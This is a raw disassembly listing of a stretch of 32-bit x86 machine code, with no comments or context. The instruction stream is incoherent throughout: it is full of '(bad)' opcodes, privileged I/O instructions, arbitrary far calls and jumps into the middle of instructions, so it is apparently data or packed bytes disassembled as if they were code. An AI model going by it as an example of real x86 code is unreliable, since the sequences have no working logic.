  41c52d:	jae    0x41c567
  41c52f:	add    BYTE PTR [esi+0x38],dl
  41c532:	cmp    DWORD PTR [ecx],0xffffffc5
  41c535:	les    edi,FWORD PTR [esi-0xc7b0015]
  41c53b:	sub    DWORD PTR ds:0x6e0abc59,ebx
  41c541:	call   0xa05d:0x6e867469
  41c548:	call   0xf5506e57
  41c54d:	test   cl,0xf1
  41c550:	xor    bh,al
  41c552:	(bad)  
  41c553:	sahf   
  41c554:	jae    0x41c5c4
  41c556:	test   eax,0x4893d7a5
  41c55b:	out    dx,al
  41c55c:	es into 
  41c55e:	sbb    esi,DWORD PTR [eax*1-0x60cd2bd8]
  41c565:	mov    ah,0x52
  41c567:	call   0x7935:0xc1d4ada5
  41c56e:	std    
  41c56f:	in     al,dx
  41c570:	jno    0x41c5c7
  41c572:	(bad)  
  41c573:	push   ebp
  41c574:	adc    eax,0x5debe668
  41c579:	jne    0x41c5f4
  41c57b:	sbb    DWORD PTR [ecx+ecx*1],0x25
  41c57f:	jae    0x41c569
  41c581:	loope  0x41c558
  41c583:	sub    ebp,eax
  41c585:	cli    
  41c586:	cmp    al,0x60
  41c588:	push   ss
  41c589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c58a:	cmp    esi,ebp
  41c58c:	stos   BYTE PTR es:[edi],al
  41c58d:	push   esi
  41c58e:	jnp    0x41c5f6
  41c590:	ret    
  41c591:	mov    eax,0x7e9b67d7
  41c596:	mov    ecx,0x6a4f4da4
  41c59b:	mov    edx,0xd8fb9e3d
  41c5a0:	mov    ebx,0xb2491b0f
  41c5a5:	mov    ds:0x283fae4a,eax
  41c5aa:	mov    dl,0xa4
  41c5ac:	jge    0x41c5d9
  41c5ae:	adc    al,0x3e
  41c5b0:	in     eax,0x9
  41c5b2:	(bad)
  41c5b5:	fistp  DWORD PTR [edx]
  41c5b7:	sub    esi,0xffffffd2
  41c5ba:	stc    
  41c5bb:	es inc esp
  41c5bd:	or     al,0x6
  41c5bf:	outs   dx,BYTE PTR ds:[esi]
  41c5c0:	inc    ebp
  41c5c1:	hlt    
  41c5c2:	(bad)  
  41c5c4:	push   edi
  41c5c5:	(bad)  
  41c5c7:	ficom  DWORD PTR [ebx+0x39]
  41c5ca:	inc    ebp
  41c5cb:	mov    ebx,0x505eea41
  41c5d0:	jae    0x41c584
  41c5d2:	fwait
  41c5d3:	add    BYTE PTR [eax+0xa],ch
  41c5d6:	jae    0x41c5fc
  41c5d8:	mov    DWORD PTR [eax+ebx*1-0x49420c1d],esi
  41c5df:	lods   al,BYTE PTR ds:[esi]
  41c5e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5e1:	rcl    DWORD PTR [ebp+0x6a],1
  41c5e4:	xchg   ecx,eax
  41c5e5:	loopne 0x41c5a5
  41c5e7:	xchg   esp,eax
  41c5e8:	add    BYTE PTR [eax-0x11],ah
  41c5eb:	mov    DWORD PTR [edi+edi*2],esp
  41c5ee:	push   ds
  41c5ef:	inc    DWORD PTR [ebp+0x3e57176]
  41c5f5:	lds    ebp,FWORD PTR ds:0xd9a78386
  41c5fb:	hlt    
  41c5fc:	nop
  41c5fd:	add    DWORD PTR [edi+0x54ce6504],edi
  41c603:	shl    esi,cl
  41c605:	(bad)  
  41c607:	adc    eax,0xbecbdbe5
  41c60c:	push   ebp
  41c60d:	lea    edi,[ecx]
  41c60f:	scas   eax,DWORD PTR es:[edi]
  41c610:	cmp    eax,0x1d052a34
  41c615:	scas   al,BYTE PTR es:[edi]
  41c616:	ins    BYTE PTR es:[edi],dx
  41c617:	scas   eax,DWORD PTR es:[edi]
  41c618:	nop
  41c619:	or     edi,DWORD PTR [esp+ebx*2-0x25ea2fb2]
  41c620:	sub    BYTE PTR [ebx],0xd5
  41c623:	lock mul BYTE PTR [edi]
  41c626:	int    0x48
  41c628:	sub    esi,ecx
  41c62a:	mov    ebx,0x6b0d59d4
  41c62f:	sbb    ebp,esi
  41c631:	add    dh,BYTE PTR [ecx-0x13]
  41c634:	out    dx,eax
  41c635:	sbb    BYTE PTR [ebp+0x6d],dl
  41c638:	or     al,0x4d
  41c63a:	sub    al,0xb2
  41c63c:	in     eax,0x2e
  41c63e:	dec    esi
  41c63f:	jmp    0xaff5:0x3a010add
  41c646:	mov    eax,ds:0x458773ef
  41c64b:	or     eax,0xb084519
  41c650:	stos   BYTE PTR es:[edi],al
  41c651:	(bad)  
  41c652:	js     0x41c6ae
  41c654:	or     eax,0xf52bba4
  41c659:	mov    bh,0x64
  41c65b:	xchg   edi,eax
  41c65c:	add    BYTE PTR [ecx-0xc481109],dl
  41c662:	mov    ebp,0xa01daaf4
  41c667:	mov    eax,ds:0xf2cadc75
  41c66c:	pop    esp
  41c66d:	shl    BYTE PTR [edx-0x66],1
  41c670:	add    ebx,ecx
  41c672:	gs ret 
  41c674:	sbb    ecx,DWORD PTR [ecx+0x7f]
  41c677:	mov    edi,?
  41c679:	iret   
  41c67a:	clts   
  41c67c:	mov    ds:0xb52b8b1b,eax
  41c681:	stos   DWORD PTR es:[edi],eax
  41c682:	push   edx
  41c683:	out    0x6f,al
  41c685:	or     al,0x50
  41c687:	dec    eax
  41c688:	fstp   QWORD PTR [ecx-0x5f7c9366]
  41c68e:	xchg   esp,eax
  41c68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c690:	xor    eax,0x8aef834f
  41c695:	mov    eax,0xe9194ed2
  41c69a:	mov    ebx,0x23cf5be7
  41c69f:	mov    cl,0x84
  41c6a1:	mov    eax,ds:0xa9904b1b
  41c6a6:	sbb    DWORD PTR [ecx+ebp*1+0x5b],esi
  41c6aa:	dec    eax
  41c6ab:	jno    0x41c649
  41c6ad:	jp     0x41c6d6
  41c6af:	jne    0x41c6ce
  41c6b1:	cmp    DWORD PTR [eax-0x64594361],eax
  41c6b7:	dec    eax
  41c6b8:	(bad)  
  41c6b9:	int3   
  41c6ba:	push   ebx
  41c6bb:	lods   eax,DWORD PTR ds:[esi]
  41c6bc:	xchg   esi,eax
  41c6bd:	inc    esp
  41c6be:	mov    ?,WORD PTR [esi]
  41c6c0:	mov    eax,0x1b44f23a
  41c6c5:	mov    eax,ds:0xa02240a8
  41c6ca:	jnp    0x41c6a2
  41c6cc:	loopne 0x41c68d
  41c6ce:	jl     0x41c68c
  41c6d0:	mov    ah,0xc3
  41c6d2:	(bad)  
  41c6d3:	mov    ds:0xf314bda1,eax
  41c6d9:	cmp    eax,DWORD PTR [edx-0x4592208]
  41c6df:	aad    0xb3
  41c6e1:	pop    es
  41c6e2:	cmp    BYTE PTR [eax+0x7f616dcb],al
  41c6e8:	xlat   BYTE PTR ds:[ebx]
  41c6e9:	pop    ss
  41c6ea:	mov    edi,0x17037014
  41c6ef:	retf   0x7ec5
  41c6f2:	dec    eax
  41c6f3:	call   0x1f1fae33
  41c6f8:	and    ebx,DWORD PTR [ecx+0x30]
  41c6fb:	cdq    
  41c6fc:	loope  0x41c763
  41c6fe:	add    cl,dh
  41c700:	fistp  DWORD PTR [eax]
  41c702:	mov    WORD PTR [ecx+0x56d0a2f7],es
  41c708:	mov    bl,0x49
  41c70a:	(bad)  
  41c70b:	jmp    0xc72f:0x14a35920
  41c712:	cmp    esi,eax
  41c714:	jbe    0x41c71f
  41c716:	in     al,dx
  41c717:	mov    dh,0x61
  41c719:	out    0xd3,al
  41c71b:	cmc    
  41c71c:	lock jle 0x41c776
  41c71f:	jmp    0x6dc1:0x7625891e
  41c726:	lods   al,BYTE PTR ds:[esi]
  41c727:	test   eax,0x6faba177
  41c72c:	dec    eax
  41c72d:	out    dx,eax
  41c72e:	bound  esi,QWORD PTR [edi-0x4c]
  41c731:	outs   dx,DWORD PTR ds:[esi]
  41c732:	adc    al,0x92
  41c734:	repz push eax
  41c736:	and    ch,dl
  41c738:	pop    ss
  41c739:	scas   al,BYTE PTR es:[edi]
  41c73a:	fist   DWORD PTR [ecx+0x47ac3f6e]
  41c740:	stos   BYTE PTR es:[edi],al
  41c741:	mov    ecx,0x4885c3d0
  41c746:	cmp    ebp,edi
  41c748:	or     eax,0xa0f10434
  41c74d:	or     eax,0xafc7c4be
  41c752:	test   DWORD PTR ds:0xeb8be0d5,ebp
  41c758:	mov    bh,0x49
  41c75a:	fwait
  41c75b:	dec    eax
  41c75c:	clc    
  41c75d:	cmp    ah,dl
  41c75f:	dec    edx
  41c760:	outs   dx,BYTE PTR ds:[esi]
  41c761:	popf   
  41c762:	in     al,0x11
  41c764:	sbb    eax,0x6cb64511
  41c769:	sbb    al,0xb7
  41c76b:	(bad)  
  41c76c:	lds    ecx,FWORD PTR [edx+0x78]
  41c76f:	in     al,dx
  41c770:	ins    BYTE PTR es:[edi],dx
  41c771:	xchg   ecx,eax
  41c772:	pop    esp
  41c773:	mov    cl,0x21
  41c775:	sbb    DWORD PTR ds:0xaea47ab3,edx
  41c77b:	pop    esp
  41c77c:	inc    ecx
  41c77d:	mov    ah,0x5b
  41c77f:	sbb    eax,DWORD PTR [esp+edi*8]
  41c782:	enter  0x8ecd,0x19
  41c786:	jnp    0x41c76a
  41c788:	and    eax,0x2f78ebe9
  41c78d:	mov    dh,0x12
  41c78f:	lods   eax,DWORD PTR ds:[esi]
  41c790:	jno    0x41c7d3
  41c792:	sub    dh,BYTE PTR [eax-0x4a]
  41c795:	dec    ebx
  41c796:	jno    0x41c762
  41c798:	and    al,0x6f
  41c79a:	push   es
  41c79b:	jbe    0x41c818
  41c79d:	push   0xb4ca2b0c
  41c7a2:	pop    es
  41c7a3:	lds    esp,FWORD PTR [eiz*4+0xc91300e]
  41c7aa:	int3   
  41c7ab:	(bad)  
  41c7ad:	sar    DWORD PTR [ecx],1
  41c7af:	mov    dl,0xfe
  41c7b1:	xchg   edi,eax
  41c7b2:	mov    bl,0xe6
  41c7b4:	pop    ss
  41c7b5:	shl    DWORD PTR [ebx-0x7b],cl
  41c7b8:	and    ecx,ebp
  41c7ba:	cmp    esi,DWORD PTR [esi-0x3d]
  41c7bd:	jb     0x41c7e3
  41c7bf:	(bad)  
  41c7c0:	dec    edi
  41c7c1:	popf   
  41c7c2:	add    bl,BYTE PTR [ecx]
  41c7c4:	lds    esp,FWORD PTR [edi]
  41c7c6:	js     0x41c7b6
  41c7c8:	inc    edi
  41c7c9:	dec    edx
  41c7ca:	into   
  41c7cb:	pusha  
  41c7cc:	push   cs
  41c7cd:	pop    esi
  41c7ce:	lods   al,BYTE PTR ds:[esi]
  41c7cf:	(bad)  
  41c7d0:	mov    ebx,0xef72bba2
  41c7d5:	sub    ebx,DWORD PTR ds:0x6a2583a3
  41c7db:	and    bh,BYTE PTR [esi+0x4dc4b1e6]
  41c7e1:	std    
  41c7e2:	repnz clc 
  41c7e4:	sbb    ch,dh
  41c7e6:	push   cs
  41c7e7:	stos   DWORD PTR es:[edi],eax
  41c7e8:	mov    ch,0x11
  41c7ea:	ret    
  41c7eb:	jmp    0x8fc84b2f
  41c7f0:	sub    BYTE PTR [ebx-0x46],0x64
  41c7f4:	scas   eax,DWORD PTR es:[edi]
  41c7f5:	cs out 0xbe,eax
  41c7f8:	ins    DWORD PTR es:[edi],dx
  41c7f9:	pop    ebx
  41c7fa:	(bad)  
  41c7fb:	xor    BYTE PTR [edi-0x2939f136],cl
  41c801:	xor    esi,ecx
  41c803:	aam    0xfa
  41c805:	retf   0xa8b9
  41c808:	cmp    bh,ah
  41c80a:	cmp    ebx,0x34ba73f5
  41c810:	inc    edi
  41c811:	test   BYTE PTR [ecx-0x377428fd],dl
  41c817:	or     BYTE PTR [ebp-0x60],dl
  41c81a:	cs jmp 0x41c7b1
  41c81d:	jae    0x41c801
  41c81f:	or     ch,0xf8
  41c822:	mov    bl,0x84
  41c824:	loop   0x41c7e7
  41c826:	outs   dx,BYTE PTR ds:[esi]
  41c827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c829:	push   0xa0e31858
  41c82e:	dec    edi
  41c82f:	and    eax,0xcb25c4b
  41c834:	sbb    BYTE PTR [ecx+0x4f85bc88],bh
  41c83a:	cwde   
  41c83b:	inc    esi
  41c83c:	fstp   DWORD PTR [ecx+0xcdf9eab]
  41c842:	xchg   ecx,eax
  41c843:	mov    edi,0xe427fdb1
  41c848:	inc    edi
  41c849:	fidivr DWORD PTR [eax-0x10ccf9c]
  41c84f:	ins    DWORD PTR es:[edi],dx
  41c850:	in     eax,0x6c
  41c852:	gs out 0x20,eax
  41c855:	not    BYTE PTR [edi+0x1887411e]
  41c85b:	out    dx,eax
  41c85c:	lahf   
  41c85d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c85e:	lahf   
  41c85f:	cmp    DWORD PTR [ebp+eiz*2-0x6a],esp
  41c863:	fidiv  DWORD PTR gs:[eax-0x3b]
  41c867:	(bad)  
  41c868:	jae    0x41c88d
  41c86a:	arpl   WORD PTR [ebp+ebp*8-0x7d],bp
  41c86e:	mov    ecx,0x3c002844
  41c873:	adc    BYTE PTR [esi+0x321fb653],dl
  41c879:	jecxz  0x41c85d
  41c87b:	mov    esp,0xbeb18479
  41c880:	imul   ebx,DWORD PTR [esi],0x4b6434b3
  41c886:	icebp  
  41c887:	sbb    al,0x25
  41c889:	xchg   ecx,eax
  41c88a:	cmc    
  41c88b:	jmp    0x691d:0x2385457f
  41c892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c893:	jecxz  0x41c8b7
  41c895:	jae    0x41c8ba
  41c897:	test   al,0xaa
  41c899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c89a:	sti    
  41c89b:	jecxz  0x41c8a7
  41c89d:	aas    
  41c89e:	or     al,0x51
  41c8a0:	je     0x41c822
  41c8a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8a3:	mov    eax,esi
  41c8a5:	pop    ds
  41c8a6:	mov    dl,0x94
  41c8a8:	cli    
  41c8a9:	mov    edi,0x6de5a7da
  41c8ae:	inc    edx
  41c8af:	out    dx,eax
  41c8b0:	loope  0x41c8a9
  41c8b2:	shr    DWORD PTR [ecx+0x17],1
  41c8b5:	dec    ecx
  41c8b6:	mov    ds:0x550db417,eax
  41c8bb:	inc    ebx
  41c8bc:	mov    ah,0xd8
  41c8be:	dec    ebx
  41c8bf:	popf   
  41c8c0:	fiadd  WORD PTR [ecx-0x26e2fbf7]
  41c8c6:	adc    eax,0xfe9e8c47
  41c8cb:	and    BYTE PTR [edx+esi*4-0x25],ch
  41c8cf:	popf   
  41c8d0:	inc    esi
  41c8d1:	xchg   al,bh
  41c8d3:	aam    0xde
  41c8d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8d6:	and    DWORD PTR [eax],ecx
  41c8d8:	stc    
  41c8d9:	sub    ebp,esp
  41c8db:	fmul   QWORD PTR [ebp+0x4dc9cda5]
  41c8e1:	push   ebp
  41c8e2:	test   BYTE PTR [ebx],ah
  41c8e4:	mov    eax,DWORD PTR [edi-0x18c991a4]
  41c8ea:	mov    dh,0x4
  41c8ec:	or     eax,DWORD PTR [edi]
  41c8ee:	pop    edi
  41c8ef:	pop    ebx
  41c8f0:	sbb    edi,esp
  41c8f2:	mov    ch,0x74
  41c8f4:	scas   al,BYTE PTR es:[edi]
  41c8f5:	jmp    0x15cc:0x4965b29
  41c8fc:	mov    bh,0x2d
  41c8fe:	fwait
  41c8ff:	std    
  41c900:	push   ss
  41c901:	xor    bh,BYTE PTR [esi+0x265b7f80]
  41c907:	cmc    
  41c908:	(bad)  
  41c909:	lahf   
  41c90a:	rcl    eax,cl
  41c90c:	pop    edi
  41c90d:	mov    ?,WORD PTR [ecx-0x13f380d9]
  41c913:	addr16 cdq 
  41c915:	loopne 0x41c978
  41c917:	loope  0x41c93d
  41c919:	xor    al,bl
  41c91b:	jmp    0x4694b240
  41c920:	pop    esp
  41c921:	in     al,dx
  41c922:	sbb    eax,0xcba1cd0a
  41c927:	psubb  mm3,mm3
  41c92a:	sub    dl,bl
  41c92c:	mov    al,0x5
  41c92e:	out    dx,eax
  41c92f:	stos   DWORD PTR es:[edi],eax
  41c930:	jae    0x41c94f
  41c932:	ret    0xdf72
  41c935:	mov    ds:0x6ccc8a1,al
  41c93a:	xor    DWORD PTR [eax-0x1373f612],esi
  41c940:	dec    esp
  41c941:	push   eax
  41c942:	sar    BYTE PTR [ebx],cl
  41c944:	xlat   BYTE PTR ds:[ebx]
  41c945:	push   cs
  41c946:	in     al,0xe6
  41c948:	and    ebx,ecx
  41c94a:	in     al,0xca
  41c94c:	sbb    al,0x1d
  41c94e:	loopne 0x41c999
  41c950:	icebp  
  41c951:	lods   ax,WORD PTR ds:[esi]
  41c953:	or     al,0x95
  41c955:	pushf  
  41c956:	(bad)  
  41c957:	adc    ecx,edi
  41c959:	cmp    dh,dh
  41c95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c95c:	push   ss
  41c95d:	dec    ecx
  41c95e:	test   BYTE PTR [ecx-0x241e4332],0x6d
  41c965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c966:	sti    
  41c967:	push   DWORD PTR [eax+eax*4]
  41c96a:	xor    DWORD PTR [edx+eiz*2-0x55],0xffffffe4
  41c96f:	jp     0x41c917
  41c971:	jl     0x41c9ef
  41c973:	dec    edx
  41c974:	out    dx,al
  41c975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c976:	jnp    0x41c9a7
  41c978:	outs   dx,DWORD PTR ds:[esi]
  41c979:	add    bh,al
  41c97b:	mov    ch,0x67
  41c97d:	into   
  41c97e:	outs   dx,DWORD PTR ds:[esi]
  41c97f:	sbb    eax,0x3743766
  41c984:	loop   0x41c9e6
  41c986:	pop    eax
  41c987:	cdq    
  41c988:	imul   ecx,ecx,0x2c
  41c98b:	adc    al,0x8c
  41c98d:	push   esi
  41c98e:	imul   edx,DWORD PTR ds:0x9cb2fb9a,0x2e2c9315
  41c998:	and    eax,0x6f8dfe3e
  41c99d:	in     al,dx
  41c99e:	mov    edx,0xf40ae074
  41c9a3:	mov    bl,0xcd
  41c9a5:	mov    al,ds:0x79b31d9b
  41c9aa:	cmp    ebp,DWORD PTR [ebp-0x77]
  41c9ad:	cld    
  41c9ae:	jb     0x41ca1c
  41c9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9b1:	pop    esi
  41c9b2:	outs   dx,DWORD PTR ds:[esi]
  41c9b3:	out    0xf2,al
  41c9b5:	les    ebx,FWORD PTR [ecx-0x1d16e451]
  41c9bb:	push   ds
  41c9bc:	jne    0x41c9da
  41c9be:	fimul  WORD PTR [ebp-0x15545b21]
  41c9c4:	sbb    DWORD PTR [esi],ecx
  41c9c6:	jae    0x41c94c
  41c9c8:	fwait
  41c9c9:	cs in  al,dx
  41c9cb:	out    0x1b,al
  41c9cd:	mov    DWORD PTR [esi-0x4],edx
  41c9d0:	(bad)  
  41c9d2:	mov    esi,0x7ba5f082
  41c9d7:	(bad)  
  41c9d8:	sbb    eax,0xc7b9e416
  41c9dd:	mov    BYTE PTR [esi+0x65],bh
  41c9e0:	icebp  
  41c9e1:	test   eax,0x106104b8
  41c9e6:	mov    ?,WORD PTR [ecx-0xf5e933b]
  41c9ec:	sub    DWORD PTR [ecx+esi*4-0x29c6e630],esp
  41c9f3:	add    eax,0xadd760d7
  41c9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9f9:	adc    bh,BYTE PTR [ebp+0x23]
  41c9fc:	loopne 0x41c9a1
  41c9fe:	pop    ebx
  41c9ff:	jns    0x41ca3a
  41ca01:	sbb    esp,DWORD PTR [edi+0x2d]
  41ca04:	sbb    BYTE PTR [eax],dl
  41ca06:	mov    bh,0x47
  41ca08:	dec    esi
  41ca09:	adc    edx,ecx
  41ca0b:	add    eax,0x94bd7273
  41ca10:	das    
  41ca11:	dec    esp
  41ca12:	or     DWORD PTR [ecx+0x55c54a46],0x6
  41ca19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca1a:	sub    ch,0x45
  41ca1d:	loopne 0x41ca51
  41ca1f:	cmp    DWORD PTR ds:0xc784ba49,eax
  41ca25:	retf   0x959
  41ca28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca29:	loope  0x41ca6b
  41ca2b:	shr    DWORD PTR [ecx+0x63],cl
  41ca2e:	jg     0x41ca22
  41ca30:	mov    eax,ds:0xec123f44
  41ca35:	inc    esp
  41ca36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca37:	gs pop eax
  41ca39:	mov    bh,0x9
  41ca3b:	fld    QWORD PTR [eax+0x3f]
  41ca3e:	retf   0x97f2
  41ca41:	daa    
  41ca42:	in     eax,0xd3
  41ca44:	jmp    0x185f:0xa1400205
  41ca4b:	out    0x8a,al
  41ca4d:	fyl2xp1 
  41ca4f:	xlat   BYTE PTR ds:[ebx]
  41ca50:	dec    esi
  41ca51:	lahf   
  41ca52:	mov    edx,edi
  41ca54:	pop    esi
  41ca55:	call   0x3a69:0x4185d691
  41ca5c:	fst    DWORD PTR [eax+0x12]
  41ca5f:	call   0xe362:0x34bec7b1
  41ca66:	nop
  41ca67:	adc    eax,DWORD PTR [esi+edi*2+0x25]
  41ca6b:	mov    dh,0x60
  41ca6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca6e:	stos   DWORD PTR es:[edi],eax
  41ca6f:	add    eax,0x910c55b4
  41ca74:	xor    eax,0x9ef423dd
  41ca79:	inc    esp
  41ca7a:	shl    BYTE PTR [ecx-0x263485f0],1
  41ca80:	add    eax,0x5a06f9a3
  41ca85:	mov    al,0x5
  41ca87:	mov    ds:0xf12879e5,eax
  41ca8c:	sub    BYTE PTR [ebp-0x35fe05f4],bl
  41ca92:	and    ch,BYTE PTR [ecx-0x58]
  41ca95:	je     0x41ca3e
  41ca97:	inc    ebx
  41ca98:	mov    dl,0x8b
  41ca9a:	mov    bh,0x10
  41ca9c:	push   edi
  41ca9d:	push   cs
  41ca9e:	mov    ebp,0xac13bcaf
  41caa3:	dec    esp
  41caa4:	outs   dx,BYTE PTR ds:[esi]
  41caa5:	popf   
  41caa6:	test   BYTE PTR [edi+esi*8-0x58abb5a5],bl
  41caad:	lds    ecx,FWORD PTR [edx]
  41caaf:	and    eax,0xa25c851b
  41cab4:	(bad)  
  41cab5:	lahf   
  41cab6:	sub    bh,BYTE PTR [edx+0x56]
  41cab9:	adc    esp,edi
  41cabb:	and    BYTE PTR [ebx],bh
  41cabd:	jle    0x41cb12
  41cabf:	jg     0x41cb10
  41cac1:	pop    ss
  41cac2:	mov    edx,0x46f075ae
  41cac7:	dec    esp
  41cac8:	inc    esp
  41cac9:	repz mov ch,0x64
  41cacc:	retf   0x4774
  41cacf:	xchg   DWORD PTR [esi+0x5647f5],esp
  41cad5:	mov    eax,0x2292aff8
  41cada:	dec    ebx
  41cadb:	pop    ebx
  41cadc:	push   ss
  41cadd:	imul   edi,DWORD PTR [esi],0xac233d54
  41cae3:	outs   dx,DWORD PTR fs:[esi]
  41cae5:	stos   BYTE PTR es:[edi],al
  41cae6:	sti    
  41cae7:	rcr    cl,1
  41cae9:	dec    ebp
  41caea:	in     eax,dx
  41caeb:	cmc    
  41caec:	mov    cl,0xef
  41caee:	stc    
  41caef:	mov    esi,0xea703e53
  41caf4:	(bad)  
  41caf5:	ins    DWORD PTR es:[edi],dx
  41caf6:	jge    0x41cb6e
  41caf8:	aaa    
  41caf9:	dec    esi
  41cafa:	daa    
  41cafb:	std    
  41cafc:	cmp    DWORD PTR [edi+eiz*4],edi
  41caff:	out    dx,al
  41cb00:	mov    bl,0x9b
  41cb02:	fwait
  41cb03:	(bad)  
  41cb04:	int    0xb3
  41cb06:	pop    ds
  41cb07:	mov    ss,WORD PTR ss:[ebx+0x6e]
  41cb0b:	mov    ds,WORD PTR ds:0xbc74bb85
  41cb11:	pop    ebx
  41cb12:	sar    esp,cl
  41cb14:	inc    ebp
  41cb15:	arpl   WORD PTR [edx+0x185c2de8],bp
  41cb1b:	outs   dx,BYTE PTR ds:[esi]
  41cb1c:	and    ecx,DWORD PTR [ecx-0x6]
  41cb1f:	cmp    DWORD PTR [ebp+0x3a35f9f4],0x5062aba3
  41cb29:	or     DWORD PTR [edi+0x43],ecx
  41cb2c:	or     BYTE PTR [edx],ch
  41cb2e:	repz add cl,BYTE PTR [ecx-0x60]
  41cb32:	nop
  41cb33:	cmc    
  41cb34:	fld    TBYTE PTR [ebx]
  41cb36:	ja     0x41cb23
  41cb38:	and    al,0xa7
  41cb3a:	sbb    edx,DWORD PTR [ebx+0x4fdb715b]
  41cb40:	retf   0x90b0
  41cb43:	rcr    DWORD PTR [eax+0x603ab7e4],cl
  41cb49:	mov    al,ds:0x640cf4b
  41cb4e:	out    0x70,eax
  41cb50:	leave  
  41cb51:	jge    0x41cb11
  41cb53:	fcomp  st(4)
  41cb55:	ficom  DWORD PTR [ecx]
  41cb57:	arpl   bp,si
  41cb59:	adc    bl,BYTE PTR [eax+0x2bf0f1aa]
  41cb5f:	imul   ebp,DWORD PTR [ecx+ebx*4],0x9c0df2d9
  41cb66:	cmp    esp,DWORD PTR [ecx+0x67]
  41cb69:	xchg   edx,eax
  41cb6a:	enter  0x2d7d,0xb0
  41cb6e:	push   ebp
  41cb6f:	out    dx,al
  41cb70:	sbb    ecx,ecx
  41cb72:	push   ecx
  41cb73:	int3   
  41cb74:	mov    esp,0x538bf754
  41cb79:	test   al,0xab
  41cb7b:	lds    esi,FWORD PTR [esi+0x270517ab]
  41cb81:	cs ins DWORD PTR es:[edi],dx
  41cb83:	mov    ebp,0xf4b7dd03
  41cb88:	or     ecx,DWORD PTR [edx-0x59]
  41cb8b:	cdq    
  41cb8c:	imul   ecx,DWORD PTR [edi+0x58],0x739b03a8
  41cb93:	out    0xdf,al
  41cb95:	enter  0x4200,0x1e
  41cb99:	cmp    DWORD PTR [esi+0x19],ecx
  41cb9c:	stc    
  41cb9d:	or     cl,ah
  41cb9f:	push   es
  41cba0:	out    0xfd,al
  41cba2:	call   0xe5ef:0x6baa154b
  41cba9:	pop    esp
  41cbaa:	int    0x5b
  41cbac:	xchg   ecx,eax
  41cbad:	cdq    
  41cbae:	popa   
  41cbaf:	into   
  41cbb0:	mov    WORD PTR [ebp+eax*8-0x3cfad14d],?
  41cbb7:	mov    ?,WORD PTR [esi+0xaa27ccb]
  41cbbd:	mov    ch,ch
  41cbbf:	or     bh,BYTE PTR [ebp-0x21b26d6]
  41cbc5:	sbb    BYTE PTR [ebp+0x6ba38419],dl
  41cbcb:	push   0x76940c3c
  41cbd0:	call   FWORD PTR [edi-0x9e7c4a5]
  41cbd6:	dec    esi
  41cbd7:	(bad)  [eax]
  41cbd9:	xor    al,0x4d
  41cbdb:	mov    cl,0x97
  41cbdd:	lock sar BYTE PTR [ebx-0x3b47935e],cl
  41cbe4:	sbb    ebx,DWORD PTR [eax]
  41cbe6:	add    BYTE PTR [edi+0x25],bh
  41cbe9:	bound  esp,QWORD PTR [edi+0x5eba31ea]
  41cbef:	out    0x20,eax
  41cbf1:	mov    DWORD PTR [edx+0x7fcf3e95],eax
  41cbf7:	inc    edi
  41cbf8:	call   0xc744796a
  41cbfd:	sahf   
  41cbfe:	and    edx,DWORD PTR [ecx-0x28]
  41cc01:	adc    al,0xf3
  41cc03:	push   es
  41cc04:	clc    
  41cc05:	loopne 0x41cc63
  41cc07:	fwait
  41cc08:	popf   
  41cc09:	and    dl,BYTE PTR ds:0xb1e2e367
  41cc0f:	push   esp
  41cc10:	and    BYTE PTR [eax+0xd],ch
  41cc13:	getsec 
  41cc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc16:	mov    edi,0x5e00b7d7
  41cc1b:	js     0x41cc3c
  41cc1d:	mov    ecx,0x1591a7b
  41cc22:	icebp  
  41cc23:	clc    
  41cc24:	adc    eax,0x947f5d7d
  41cc29:	call   0xc0b:0xf1bcef97
  41cc30:	pop    ds
  41cc31:	jmp    0x7be6d25
  41cc36:	sti    
  41cc37:	inc    ecx
  41cc38:	push   cs
  41cc39:	jno    0x41cc78
  41cc3b:	sti    
  41cc3c:	jo     0x41cbde
  41cc3e:	mov    esp,ebp
  41cc40:	jmp    0x41cc44
  41cc42:	frstor [edi-0x2c75f6ea]
  41cc48:	jle    0x41cc0a
  41cc4a:	ret    0x3f72
  41cc4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc4e:	fwait
  41cc4f:	push   ss
  41cc50:	cmp    esp,DWORD PTR [edi]
  41cc52:	aaa    
  41cc53:	mov    esi,0xb66052bd
  41cc58:	pop    esi
  41cc59:	jl     0x41cc10
  41cc5b:	push   esp
  41cc5c:	push   edx
  41cc5d:	ins    BYTE PTR es:[edi],dx
  41cc5e:	cmp    dh,dh
  41cc60:	jne    0x41cc15
  41cc62:	out    dx,eax
  41cc63:	in     al,0xa0
  41cc65:	mul    DWORD PTR [ebx-0x53]
  41cc68:	push   esp
  41cc69:	dec    ecx
  41cc6a:	(bad)  
  41cc6b:	scas   al,BYTE PTR es:[edi]
  41cc6c:	cmp    dl,BYTE PTR [edi-0x7e2a22b1]
  41cc72:	shr    eax,cl
  41cc74:	das    
  41cc75:	cmp    ch,ah
  41cc77:	loopne 0x41cc99
  41cc79:	dec    ecx
  41cc7a:	add    al,BYTE PTR [edx]
  41cc7c:	(bad)  
  41cc7d:	adc    eax,0x9dff26ab
  41cc82:	retf   
  41cc83:	push   ecx
  41cc84:	dec    ebx
  41cc85:	repnz pop ebx
  41cc87:	int3   
  41cc88:	xchg   ebp,eax
  41cc89:	mov    dl,0xbc
  41cc8b:	stc    
